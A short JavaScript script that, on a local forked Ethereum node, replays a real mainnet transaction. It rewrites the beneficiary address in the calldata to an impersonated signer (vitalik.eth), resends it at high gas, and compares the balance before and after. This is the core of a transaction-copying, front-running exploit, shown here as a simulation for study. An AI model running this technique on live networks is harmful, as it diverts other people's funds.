const ethers = require('ethers');

// Simulate this tx
// https://twitter.com/bertcmiller/status/1544496577338826752
// https://etherscan.io/address/0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944
const url = "http://127.0.0.1:1337";
const provider = new ethers.providers.JsonRpcProvider(url);
const signer = provider.getSigner("0xd8da6bf26964af9d7eed9e03e53415d37aa96045"); // vitalik.eth

// https://etherscan.io/tx/0x1adfd037aeb717607ae6d480f6694380daad9fcd4686a63be3fd29778e8ca412
const get_transaction = async () => {
    return await provider.getTransaction("0x1adfd037aeb717607ae6d480f6694380daad9fcd4686a63be3fd29778e8ca412")
}

const rewrite_transaction = (tx) => {
    const to = tx.to;
    var data = tx.data.replace("0468c8d4e517c37267aa1dbf307350ffc996cbcb", "d8da6bf26964af9d7eed9e03e53415d37aa96045");
    return {
        to: to,
        data: data,
        gasPrice: "0xE8D4A51000" // 1000gwei
    }
}

const send_transaction = async (tx) => {
    return await signer.sendTransaction(tx)
}

const get_balance = async () => {
    return await provider.getBalance("0xd8da6bf26964af9d7eed9e03e53415d37aa96045")
}

get_balance().then(balance => {
    console.log(balance.toString()); // balance before
    return get_transaction()
}).then(previous_tx => {
    current_tx = rewrite_transaction(previous_tx);
    return send_transaction(current_tx)
}).then(tx => {
    console.log(tx);
    return get_balance()
}).then(balance => {
    console.log(balance.toString()) // balance after
})